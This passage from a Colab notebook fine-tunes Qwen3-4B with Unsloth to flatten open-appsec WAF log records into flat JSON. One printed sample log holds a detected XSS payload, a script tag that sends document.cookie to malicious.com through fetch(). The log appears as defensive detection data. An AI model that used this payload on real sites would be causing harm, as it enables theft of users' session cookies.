# %% [markdown]
# <a href="https://colab.research.google.com/github/novalsunn123/finetune/blob/main/qwen-parser.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

# %%
# %%capture
import os
if "COLAB_" not in "".join(os.environ.keys()):
    # !pip install unsloth
else:
    # Do this only in Colab notebooks! Otherwise use pip install unsloth
    # !pip install --no-deps bitsandbytes accelerate xformers==0.0.29.post3 peft trl==0.15.2 triton cut_cross_entropy unsloth_zoo
    # !pip install sentencepiece protobuf "datasets>=3.4.1" huggingface_hub hf_transfer
    # !pip install --no-deps unsloth

# %%
from unsloth import FastLanguageModel
import torch

model, tokenizer = FastLanguageModel.from_pretrained(
    model_name = "unsloth/Qwen3-4B",
    max_seq_length = 2048,   # Context length - can be longer, but uses more memory
    load_in_4bit = True,     # 4bit uses much less memory
    load_in_8bit = False,    # A bit more accurate, uses 2x memory
    full_finetuning = False, # We have full finetuning now!
    # token = "hf_...",      # use one if using gated models
)
# Out:
# 🦥 Unsloth: Will patch your computer to enable 2x faster free finetuning.
# 🦥 Unsloth Zoo will now patch everything to make training faster!
# ==((====))==  Unsloth 2025.6.12: Fast Qwen3 patching. Transformers: 4.53.0.
#    \\   /|    Tesla T4. Num GPUs = 1. Max memory: 14.741 GB. Platform: Linux.
# O^O/ \_/ \    Torch: 2.6.0+cu124. CUDA: 7.5. CUDA Toolkit: 12.4. Triton: 3.2.0
# \        /    Bfloat16 = FALSE. FA [Xformers = 0.0.29.post3. FA2 = False]
#  "-____-"     Free license: http://github.com/unslothai/unsloth
# Unsloth: Fast downloading is enabled - ignore downloading bars which are red colored!

# %%
model = FastLanguageModel.get_peft_model(
    model,
    r = 32,           # Choose any number > 0! Suggested 8, 16, 32, 64, 128
    target_modules = ["q_proj", "k_proj", "v_proj", "o_proj",
                      "gate_proj", "up_proj", "down_proj",],
    lora_alpha = 32,  # Best to choose alpha = rank or rank*2
    lora_dropout = 0, # Supports any, but = 0 is optimized
    bias = "none",    # Supports any, but = "none" is optimized
    # [NEW] "unsloth" uses 30% less VRAM, fits 2x larger batch sizes!
    use_gradient_checkpointing = "unsloth", # True or "unsloth" for very long context
    random_state = 3407,
    use_rslora = False,   # We support rank stabilized LoRA
    loftq_config = None,  # And LoftQ
)
# Out:
# Unsloth 2025.6.12 patched 36 layers with 36 QKV layers, 36 O layers and 36 MLP layers.

# %%
# 3. Hàm xem dataset
def view_dataset(dataset, name="Dataset", num_samples=2):
    print(f"\n--- Xem {name} ---")
    print(f"Số bản ghi: {len(dataset)}")
    print(f"Các cột: {dataset.column_names}")
    print(f"Mẫu {num_samples} bản ghi đầu tiên:")
    for i in range(min(num_samples, len(dataset))):
        print(f"Bản ghi {i}:")
        print(dataset[i])
    print("-------------------")

# %%
import json
import os
from datasets import Dataset
from google.colab import files  # Chỉ cần nếu dùng Google Colab

print("\nTải file security_dataset.json...")
dataset_path = '/content/dataset.json'

# Kiểm tra file tồn tại, nếu không thì yêu cầu tải lên
if not os.path.exists(dataset_path):
    print(f"File '{dataset_path}' không tồn tại. Tải file lên...")
    uploaded = files.upload()
    if 'dataset.json' not in uploaded:
        print("Error: Vui lòng tải file 'security_dataset.json'")
        raise FileNotFoundError("File 'security_dataset.json' không được tải lên.")

try:
    with open(dataset_path, 'r') as f:
        data = json.load(f)

    # Chuyển đổi dữ liệu thành danh sách các từ điển
    flattened_data = [
        {
            "input": pair[0]["input"],
            "content": pair[1]["content"],
            "input_role": pair[0]["role"],
            "content_role": pair[1]["role"]
        }
        for pair in data
    ]

    # Chuyển thành Dataset để kiểm tra
    raw_dataset = Dataset.from_list(flattened_data)
    print(raw_dataset)  # Hiển thị thông tin dataset để kiểm tra

except FileNotFoundError:
    print(f"Error: File '{dataset_path}' not found.")
    raise
except json.JSONDecodeError:
    print("Error: Invalid JSON format in the file.")
    raise
except Exception as e:
    print(f"Error: {str(e)}")
    raise
# Out:
# Tải file security_dataset.json...
# Dataset({
#     features: ['input', 'content', 'input_role', 'content_role'],
#     num_rows: 62
# })

# %% [markdown]
# dataset phân tích log openappsec

# %%
def generate_conversation(examples):
    conversations = []
    for input_data, content_data in zip(examples["input"], examples["content"]):
        conversation = [
            {
                "role": "user",
                "content": f"{input_data}\ndo log processing for me from above file into understandable form for machine learning to read"
            },
            {
                "role": "assistant",
                "content": f"{content_data}"
            }
        ]
        conversations.append(conversation)
    return {"conversations": conversations}

print("\nTạo conversation...")
conversation_dataset = raw_dataset.map(generate_conversation, batched=True)
view_dataset(conversation_dataset, "Conversation Dataset")
# Out:
# Tạo conversation...
# Map:   0%|          | 0/62 [00:00<?, ? examples/s]
# --- Xem Conversation Dataset ---
# Số bản ghi: 62
# Các cột: ['input', 'content', 'input_role', 'content_role', 'conversations']
# Mẫu 2 bản ghi đầu tiên:
# Bản ghi 0:
# {'input': '{"eventTime": "2025-06-20T14:04:40.273", "eventName": "Web AppSec Policy Loaded Successfully", "eventSeverity": "Info", "eventPriority": "Low", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags": ["Threat Prevention"], "eventSource": {"agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventTraceId": "", "eventSpanId": "", "issuingEngineVersion": "", "serviceName": "HTTP Transaction Handler", "serviceId": "1"}, "eventData": {"logIndex": 1}}', 'content': '{"eventTime": "2025-06-20T14:04:40.273", "eventName": "Web AppSec Policy Loaded Successfully", "eventSeverity": "Info", "eventPriority": "Low", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags_0": "Threat Prevention", "eventSource_agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventSource_eventTraceId": "", "eventSource_eventSpanId": "", "eventSource_issuingEngineVersion": "", "eventSource_serviceName": "HTTP Transaction Handler", "eventSource_serviceId": "1", "eventData_logIndex": 1, "eventData_assetId": null, "eventData_practiceId": null, "eventData_waapFoundIndicators": null, "eventData_httpMethod": null, "eventData_ruleName": null, "eventData_practiceName": null, "eventData_waapUserReputationScore": null, "eventData_waapCalculatedThreatLevel": null, "eventSource_assetName": null, "eventData_matchedSample": null, "eventData_waapFinalScore": null, "eventData_eventConfidence": null, "eventData_waapIncidentType": null, "eventData_serviceName": null, "eventData_httpHostName": null, "eventData_practiceType": null, "eventSource_assetId": null, "eventData_learnedIndicators": null, "eventData_eventReferenceId": null, "eventData_assetName": null, "eventData_matchedLocation": null, "eventData_waapOverride": null, "eventData_httpSourceId": null, "eventData_matchedIndicators": null, "eventData_matchedParameter": null, "eventData_waapUriFalsePositiveScore": null, "eventData_waapUserReputation": null, "eventData_ruleId": null, "eventData_waapKeywordsScore": null, "eventTags_1": null, "eventData_reservedNgenA": null, "eventData_sourcePort": null, "eventData_sourceIP": null, "eventData_securityAction": null, "eventData_practiceSubType": null}', 'input_role': 'user', 'content_role': 'assistant', 'conversations': [{'content': '{"eventTime": "2025-06-20T14:04:40.273", "eventName": "Web AppSec Policy Loaded Successfully", "eventSeverity": "Info", "eventPriority": "Low", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags": ["Threat Prevention"], "eventSource": {"agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventTraceId": "", "eventSpanId": "", "issuingEngineVersion": "", "serviceName": "HTTP Transaction Handler", "serviceId": "1"}, "eventData": {"logIndex": 1}}\ndo log processing for me from above file into understandable form for machine learning to read', 'role': 'user'}, {'content': '{"eventTime": "2025-06-20T14:04:40.273", "eventName": "Web AppSec Policy Loaded Successfully", "eventSeverity": "Info", "eventPriority": "Low", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags_0": "Threat Prevention", "eventSource_agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventSource_eventTraceId": "", "eventSource_eventSpanId": "", "eventSource_issuingEngineVersion": "", "eventSource_serviceName": "HTTP Transaction Handler", "eventSource_serviceId": "1", "eventData_logIndex": 1, "eventData_assetId": null, "eventData_practiceId": null, "eventData_waapFoundIndicators": null, "eventData_httpMethod": null, "eventData_ruleName": null, "eventData_practiceName": null, "eventData_waapUserReputationScore": null, "eventData_waapCalculatedThreatLevel": nul ...
# Bản ghi 1:
# {'input': '{"eventTime": "2025-06-20T14:04:40.719", "eventName": "Check Point Nano-service started", "eventSeverity": "Info", "eventPriority": "Medium", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags": ["Informational"], "eventSource": {"agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventTraceId": "", "eventSpanId": "", "issuingEngineVersion": "1.1.26-open-source", "serviceName": "HTTP Transaction Handler", "serviceId": "1"}, "eventData": {"logIndex": 2, "serviceName": "HTTP Transaction Handler"}}', 'content': '{"eventTime": "2025-06-20T14:04:40.719", "eventName": "Check Point Nano-service started", "eventSeverity": "Info", "eventPriority": "Medium", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags_0": "Informational", "eventSource_agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventSource_eventTraceId": "", "eventSource_eventSpanId": "", "eventSource_issuingEngineVersion": "1.1.26-open-source", "eventSource_serviceName": "HTTP Transaction Handler", "eventSource_serviceId": "1", "eventData_logIndex": 2, "eventData_serviceName": "HTTP Transaction Handler", "eventData_assetId": null, "eventData_practiceId": null, "eventData_waapFoundIndicators": null, "eventData_httpMethod": null, "eventData_ruleName": null, "eventData_practiceName": null, "eventData_waapUserReputationScore": null, "eventData_waapCalculatedThreatLevel": null, "eventSource_assetName": null, "eventData_matchedSample": null, "eventData_waapFinalScore": null, "eventData_eventConfidence": null, "eventData_waapIncidentType": null, "eventData_httpHostName": null, "eventData_practiceType": null, "eventSource_assetId": null, "eventData_learnedIndicators": null, "eventData_eventReferenceId": null, "eventData_assetName": null, "eventData_matchedLocation": null, "eventData_waapOverride": null, "eventData_httpSourceId": null, "eventData_matchedIndicators": null, "eventData_matchedParameter": null, "eventData_waapUriFalsePositiveScore": null, "eventData_waapUserReputation": null, "eventData_ruleId": null, "eventData_waapKeywordsScore": null, "eventTags_1": null, "eventData_reservedNgenA": null, "eventData_sourcePort": null, "eventData_sourceIP": null, "eventData_securityAction": null, "eventData_practiceSubType": null}', 'input_role': 'user', 'content_role': 'assistant', 'conversations': [{'content': '{"eventTime": "2025-06-20T14:04:40.719", "eventName": "Check Point Nano-service started", "eventSeverity": "Info", "eventPriority": "Medium", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags": ["Informational"], "eventSource": {"agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventTraceId": "", "eventSpanId": "", "issuingEngineVersion": "1.1.26-open-source", "serviceName": "HTTP Transaction Handler", "serviceId": "1"}, "eventData": {"logIndex": 2, "serviceName": "HTTP Transaction Handler"}}\ndo log processing for me from above file into understandable form for machine learning to read', 'role': 'user'}, {'content': '{"eventTime": "2025-06-20T14:04:40.719", "eventName": "Check Point Nano-service started", "eventSeverity": "Info", "eventPriority": "Medium", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags_0": "Informational", "eventSource_agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventSource_eventTraceId": "", "eventSource_eventSpanId": "", "eventSource_issuingEngineVersion": "1.1.26-open-source", "eventSource_serviceName": "HTTP Transaction Handler", "eventSource_serviceId": "1", "eventData_logIndex": 2, "eventData_serviceName": "HTTP Transaction Handler", "eventData_assetId": null, "eventData_practiceId": null, "even ...

# %%
# Kiểm tra reasoning_conversations
print("\nKiểm tra reasoning_conversations:")
for i in range(min(2, len(conversation_dataset))):
    print(f"Chuỗi {i}:")
    print(conversation_dataset[i])
# Out:
# Kiểm tra reasoning_conversations:
# Chuỗi 0:
# {'input': '{"eventTime": "2025-06-20T14:04:40.273", "eventName": "Web AppSec Policy Loaded Successfully", "eventSeverity": "Info", "eventPriority": "Low", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags": ["Threat Prevention"], "eventSource": {"agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventTraceId": "", "eventSpanId": "", "issuingEngineVersion": "", "serviceName": "HTTP Transaction Handler", "serviceId": "1"}, "eventData": {"logIndex": 1}}', 'content': '{"eventTime": "2025-06-20T14:04:40.273", "eventName": "Web AppSec Policy Loaded Successfully", "eventSeverity": "Info", "eventPriority": "Low", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags_0": "Threat Prevention", "eventSource_agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventSource_eventTraceId": "", "eventSource_eventSpanId": "", "eventSource_issuingEngineVersion": "", "eventSource_serviceName": "HTTP Transaction Handler", "eventSource_serviceId": "1", "eventData_logIndex": 1, "eventData_assetId": null, "eventData_practiceId": null, "eventData_waapFoundIndicators": null, "eventData_httpMethod": null, "eventData_ruleName": null, "eventData_practiceName": null, "eventData_waapUserReputationScore": null, "eventData_waapCalculatedThreatLevel": null, "eventSource_assetName": null, "eventData_matchedSample": null, "eventData_waapFinalScore": null, "eventData_eventConfidence": null, "eventData_waapIncidentType": null, "eventData_serviceName": null, "eventData_httpHostName": null, "eventData_practiceType": null, "eventSource_assetId": null, "eventData_learnedIndicators": null, "eventData_eventReferenceId": null, "eventData_assetName": null, "eventData_matchedLocation": null, "eventData_waapOverride": null, "eventData_httpSourceId": null, "eventData_matchedIndicators": null, "eventData_matchedParameter": null, "eventData_waapUriFalsePositiveScore": null, "eventData_waapUserReputation": null, "eventData_ruleId": null, "eventData_waapKeywordsScore": null, "eventTags_1": null, "eventData_reservedNgenA": null, "eventData_sourcePort": null, "eventData_sourceIP": null, "eventData_securityAction": null, "eventData_practiceSubType": null}', 'input_role': 'user', 'content_role': 'assistant', 'conversations': [{'content': '{"eventTime": "2025-06-20T14:04:40.273", "eventName": "Web AppSec Policy Loaded Successfully", "eventSeverity": "Info", "eventPriority": "Low", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags": ["Threat Prevention"], "eventSource": {"agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventTraceId": "", "eventSpanId": "", "issuingEngineVersion": "", "serviceName": "HTTP Transaction Handler", "serviceId": "1"}, "eventData": {"logIndex": 1}}\ndo log processing for me from above file into understandable form for machine learning to read', 'role': 'user'}, {'content': '{"eventTime": "2025-06-20T14:04:40.273", "eventName": "Web AppSec Policy Loaded Successfully", "eventSeverity": "Info", "eventPriority": "Low", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags_0": "Threat Prevention", "eventSource_agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventSource_eventTraceId": "", "eventSource_eventSpanId": "", "eventSource_issuingEngineVersion": "", "eventSource_serviceName": "HTTP Transaction Handler", "eventSource_serviceId": "1", "eventData_logIndex": 1, "eventData_assetId": null, "eventData_practiceId": null, "eventData_waapFoundIndicators": null, "eventData_httpMethod": null, "eventData_ruleName": null, "eventData_practiceName": null, "eventData_waapUserReputationScore": null, "eventData_waapCalculatedThreatLevel": nul ...
# Chuỗi 1:
# {'input': '{"eventTime": "2025-06-20T14:04:40.719", "eventName": "Check Point Nano-service started", "eventSeverity": "Info", "eventPriority": "Medium", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags": ["Informational"], "eventSource": {"agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventTraceId": "", "eventSpanId": "", "issuingEngineVersion": "1.1.26-open-source", "serviceName": "HTTP Transaction Handler", "serviceId": "1"}, "eventData": {"logIndex": 2, "serviceName": "HTTP Transaction Handler"}}', 'content': '{"eventTime": "2025-06-20T14:04:40.719", "eventName": "Check Point Nano-service started", "eventSeverity": "Info", "eventPriority": "Medium", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags_0": "Informational", "eventSource_agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventSource_eventTraceId": "", "eventSource_eventSpanId": "", "eventSource_issuingEngineVersion": "1.1.26-open-source", "eventSource_serviceName": "HTTP Transaction Handler", "eventSource_serviceId": "1", "eventData_logIndex": 2, "eventData_serviceName": "HTTP Transaction Handler", "eventData_assetId": null, "eventData_practiceId": null, "eventData_waapFoundIndicators": null, "eventData_httpMethod": null, "eventData_ruleName": null, "eventData_practiceName": null, "eventData_waapUserReputationScore": null, "eventData_waapCalculatedThreatLevel": null, "eventSource_assetName": null, "eventData_matchedSample": null, "eventData_waapFinalScore": null, "eventData_eventConfidence": null, "eventData_waapIncidentType": null, "eventData_httpHostName": null, "eventData_practiceType": null, "eventSource_assetId": null, "eventData_learnedIndicators": null, "eventData_eventReferenceId": null, "eventData_assetName": null, "eventData_matchedLocation": null, "eventData_waapOverride": null, "eventData_httpSourceId": null, "eventData_matchedIndicators": null, "eventData_matchedParameter": null, "eventData_waapUriFalsePositiveScore": null, "eventData_waapUserReputation": null, "eventData_ruleId": null, "eventData_waapKeywordsScore": null, "eventTags_1": null, "eventData_reservedNgenA": null, "eventData_sourcePort": null, "eventData_sourceIP": null, "eventData_securityAction": null, "eventData_practiceSubType": null}', 'input_role': 'user', 'content_role': 'assistant', 'conversations': [{'content': '{"eventTime": "2025-06-20T14:04:40.719", "eventName": "Check Point Nano-service started", "eventSeverity": "Info", "eventPriority": "Medium", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags": ["Informational"], "eventSource": {"agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventTraceId": "", "eventSpanId": "", "issuingEngineVersion": "1.1.26-open-source", "serviceName": "HTTP Transaction Handler", "serviceId": "1"}, "eventData": {"logIndex": 2, "serviceName": "HTTP Transaction Handler"}}\ndo log processing for me from above file into understandable form for machine learning to read', 'role': 'user'}, {'content': '{"eventTime": "2025-06-20T14:04:40.719", "eventName": "Check Point Nano-service started", "eventSeverity": "Info", "eventPriority": "Medium", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags_0": "Informational", "eventSource_agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventSource_eventTraceId": "", "eventSource_eventSpanId": "", "eventSource_issuingEngineVersion": "1.1.26-open-source", "eventSource_serviceName": "HTTP Transaction Handler", "eventSource_serviceId": "1", "eventData_logIndex": 2, "eventData_serviceName": "HTTP Transaction Handler", "eventData_assetId": null, "eventData_practiceId": null, "even ...

# %%
import pandas as pd
from datasets import Dataset
# 8. Chuyển thành Dataset cuối cùng
print("\nTạo Dataset cuối cùng...")
data_series = pd.Series(conversation_dataset)
data_series.name = "text"
combined_dataset = Dataset.from_pandas(pd.DataFrame(data_series))
combined_dataset = combined_dataset.shuffle(seed=3407)
view_dataset(combined_dataset, "Final Dataset")
# Out:
# Tạo Dataset cuối cùng...
#
# --- Xem Final Dataset ---
# Số bản ghi: 62
# Các cột: ['text']
# Mẫu 2 bản ghi đầu tiên:
# Bản ghi 0:
# {'text': {'content': '{"eventTime": "2025-06-21T15:06:06.956", "eventName": "Web Request", "eventSeverity": "Medium", "eventPriority": "Medium", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags_0": "Threat Prevention", "eventTags_1": "Web Application & API Protection", "eventSource_agentId": "Unknown", "eventSource_eventTraceId": "", "eventSource_eventSpanId": "", "eventSource_issuingEngineVersion": "1.1.26-open-source", "eventSource_serviceName": "HTTP Transaction Handler", "eventSource_serviceId": "1", "eventSource_assetId": "Any", "eventSource_assetName": "Any", "eventData_logIndex": 8, "eventData_eventReferenceId": "baa50603-e006-43d5-861f-facdcdb6e01e", "eventData_assetId": "Any", "eventData_assetName": "Any", "eventData_eventConfidence": "Medium", "eventData_sourceIP": "192.168.136.231", "eventData_httpSourceId": "192.168.136.231", "eventData_sourcePort": 56265, "eventData_httpHostName": "192.168.136.147:82", "eventData_httpMethod": "POST", "eventData_ruleId": "Any", "eventData_securityAction": "Detect", "eventData_waapOverride": "None", "eventData_practiceType": "Threat Prevention", "eventData_practiceSubType": "Web Application", "eventData_ruleName": "Any", "eventData_practiceId": "3943d645-b4dd-4185-b9e8-bbf46642b795", "eventData_practiceName": "local_policy/appsec-best-practice", "eventData_waapIncidentType": "General", "eventData_matchedSample": "o\'reilly", "eventData_matchedLocation": "body", "eventData_matchedParameter": "username", "eventData_waapFoundIndicators": "[\', probing]", "eventData_matchedIndicators": "[\', probing]", "eventData_learnedIndicators": "", "eventData_waapUserReputationScore": 128, "eventData_waapUserReputation": "Low", "eventData_waapUriFalsePositiveScore": 864, "eventData_waapKeywordsScore": 184, "eventData_reservedNgenA": 0, "eventData_waapFinalScore": 286, "eventData_waapCalculatedThreatLevel": 2, "eventData_serviceName": null}', 'content_role': 'assistant', 'conversations': [{'content': '{"eventTime": "2025-06-21T15:06:06.956", "eventName": "Web Request", "eventSeverity": "Medium", "eventPriority": "Medium", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags": ["Threat Prevention", "Web Application & API Protection"], "eventSource": {"agentId": "Unknown", "eventTraceId": "", "eventSpanId": "", "issuingEngineVersion": "1.1.26-open-source", "serviceName": "HTTP Transaction Handler", "serviceId": "1", "assetId": "Any", "assetName": "Any"}, "eventData": {"logIndex": 8, "eventReferenceId": "baa50603-e006-43d5-861f-facdcdb6e01e", "assetId": "Any", "assetName": "Any", "eventConfidence": "Medium", "sourceIP": "192.168.136.231", "httpSourceId": "192.168.136.231", "sourcePort": 56265, "httpHostName": "192.168.136.147:82", "httpMethod": "POST", "ruleId": "Any", "securityAction": "Detect", "waapOverride": "None", "practiceType": "Threat Prevention", "practiceSubType": "Web Application", "ruleName": "Any", "practiceId": "3943d645-b4dd-4185-b9e8-bbf46642b795", "practiceName": "local_policy/appsec-best-practice", "waapIncidentType": "General", "matchedSample": "o\'reilly", "matchedLocation": "body", "matchedParameter": "username", "waapFoundIndicators": "[\', probing]", "matchedIndicators": "[\', probing]", "learnedIndicators": "", "waapUserReputationScore": 128, "waapUserReputation": "Low", "waapUriFalsePositiveScore": 864, "waapKeywordsScore": 184, "reservedNgenA": 0, "waapFinalScore": 286, "waapCalculatedThreatLevel": 2}}\ndo log processing for me from above file into understandable form for machine learning to read', 'role': 'user'}, {'content': '{"eventTime": "2025-06-21T15:06:06.956", "eventName": "Web Request", "eventSeverity": "Medium", "eventPriority": "Medium", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAud ...
# Bản ghi 1:
# {'text': {'content': '{"eventTime": "2025-06-21T15:24:18.912", "eventName": "Web Request", "eventSeverity": "Critical", "eventPriority": "High", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags_0": "Threat Prevention", "eventTags_1": "Web Application & API Protection", "eventSource_agentId": "Unknown", "eventSource_eventTraceId": "", "eventSource_eventSpanId": "", "eventSource_issuingEngineVersion": "1.1.26-open-source", "eventSource_serviceName": "HTTP Transaction Handler", "eventSource_serviceId": "1", "eventSource_assetId": "Any", "eventSource_assetName": "Any", "eventData_logIndex": 14, "eventData_eventReferenceId": "b6951c9e-fd66-4f84-a7f1-0d7c33e2e70b", "eventData_assetId": "Any", "eventData_assetName": "Any", "eventData_eventConfidence": "Very High", "eventData_sourceIP": "192.168.136.158", "eventData_httpSourceId": "192.168.136.158", "eventData_sourcePort": 56302, "eventData_httpHostName": "192.168.136.147:82", "eventData_httpMethod": "POST", "eventData_ruleId": "Any", "eventData_securityAction": "Detect", "eventData_waapOverride": "None", "eventData_practiceType": "Threat Prevention", "eventData_practiceSubType": "Web Application", "eventData_ruleName": "Any", "eventData_practiceId": "3943d645-b4dd-4185-b9e8-bbf46642b795", "eventData_practiceName": "local_policy/appsec-best-practice", "eventData_waapIncidentType": "Cross Site Scripting, Remote Code Execution", "eventData_matchedSample": "username=<script>fetch(\'https://malicious.com?cookie=\' document.cookie)</script>", "eventData_matchedLocation": "body", "eventData_matchedParameter": "password", "eventData_waapFoundIndicators": "[\', <, <script, =, >, code_execution_fast_reg_0, document., document.cookie]", "eventData_matchedIndicators": "[\', <, <script, =, >, code_execution_fast_reg_0, document., document.cookie]", "eventData_learnedIndicators": "", "eventData_waapUserReputationScore": 153, "eventData_waapUserReputation": "Low", "eventData_waapUriFalsePositiveScore": 864, "eventData_waapKeywordsScore": 855, "eventData_reservedNgenA": 0, "eventData_waapFinalScore": 1000, "eventData_waapCalculatedThreatLevel": 4, "eventData_serviceName": null}', 'content_role': 'assistant', 'conversations': [{'content': '{"eventTime": "2025-06-21T15:24:18.912", "eventName": "Web Request", "eventSeverity": "Critical", "eventPriority": "High", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags": ["Threat Prevention", "Web Application & API Protection"], "eventSource": {"agentId": "Unknown", "eventTraceId": "", "eventSpanId": "", "issuingEngineVersion": "1.1.26-open-source", "serviceName": "HTTP Transaction Handler", "serviceId": "1", "assetId": "Any", "assetName": "Any"}, "eventData": {"logIndex": 14, "eventReferenceId": "b6951c9e-fd66-4f84-a7f1-0d7c33e2e70b", "assetId": "Any", "assetName": "Any", "eventConfidence": "Very High", "sourceIP": "192.168.136.158", "httpSourceId": "192.168.136.158", "sourcePort": 56302, "httpHostName": "192.168.136.147:82", "httpMethod": "POST", "ruleId": "Any", "securityAction": "Detect", "waapOverride": "None", "practiceType": "Threat Prevention", "practiceSubType": "Web Application", "ruleName": "Any", "practiceId": "3943d645-b4dd-4185-b9e8-bbf46642b795", "practiceName": "local_policy/appsec-best-practice", "waapIncidentType": "Cross Site Scripting, Remote Code Execution", "matchedSample": "username=<script>fetch(\'https://malicious.com?cookie=\' document.cookie)</script>", "matchedLocation": "body", "matchedParameter": "password", "waapFoundIndicators": "[\', <, <script, =, >, code_execution_fast_reg_0, document., document.cookie]", "matchedIndicators": "[\', <, <script, =, >, code_execution_fast_reg_0, document., document.cookie]", "learnedIndicators": "", "waapUserReputationScore": 153, "waapUserReputation": "Low", "waapUriFalsePosi ...

# %%
import pandas as pd
from datasets import Dataset
import json


print("\nKiểm tra reasoning_conversations:")
for i in range(min(2, len(conversation_dataset))):
    print(f"Chuỗi {i}:")
    print(conversation_dataset[i])

def fill_none_values(obj, default_value=""):
    if isinstance(obj, dict):
        return {k: fill_none_values(v, default_value) for k, v in obj.items()}
    elif isinstance(obj, list):
        return [fill_none_values(elem, default_value) for elem in obj]
    elif obj is None or (isinstance(obj, str) and obj.lower() == "null"):
        return default_value
    else:
        return obj

# Hàm định dạng conversation thành chuỗi văn bản
def format_conversation(example):
    processed_conversations = [] # Đổi tên biến để rõ ràng hơn

    for turn in example["conversations"]:
        try:
            # Tải nội dung JSON hiện tại của lượt đối thoại
            # Cả user và assistant đều được xử lý ở đây
            current_content_dict = json.loads(turn["content"])

            # Áp dụng hàm điền giá trị mặc định cho nội dung đã tải
            cleaned_content_dict = fill_none_values(current_content_dict, default_value="")

            # Ghi lại nội dung đã làm sạch dưới dạng chuỗi JSON
            turn["content"] = json.dumps(cleaned_content_dict, ensure_ascii=False)
        except json.JSONDecodeError as e:
            # Nếu content không phải JSON hợp lệ, in lỗi và giữ nguyên content.
            # Bạn có thể cân nhắc gán turn["content"] = default_value (ví dụ: "") nếu muốn làm sạch cả chuỗi không phải JSON.
            # print(f"JSONDecodeError for role '{turn['role']}': {turn['content']}. Error: {e}")
            pass # Giữ nguyên content nếu không thể phân tích JSON

        processed_conversations.append(turn)

    text = json.dumps(processed_conversations, ensure_ascii=False)
    return {"text": text}

# print("\nTạo conversation...")
# conversation_dataset = raw_dataset.map(generate_conversation, batched=True)
# view_dataset(conversation_dataset, "Conversation Dataset")

print("\nTạo Dataset cuối cùng...")
# Áp dụng hàm format_conversation để tạo cột text
combined_dataset = conversation_dataset.map(format_conversation, batched=False)

# Xóa các cột không cần thiết, chỉ giữ cột text
combined_dataset = combined_dataset.remove_columns([col for col in combined_dataset.column_names if col != "text"])

# Xáo trộn dataset
combined_dataset = combined_dataset.shuffle(seed=3407)

# Hiển thị dataset
def view_dataset(dataset, name):
    print(f"\n--- Xem {name} ---")
    print(f"Số bản ghi: {len(dataset)}")
    print(f"Các cột: {dataset.column_names}")
    print("Mẫu 2 bản ghi đầu tiên:")
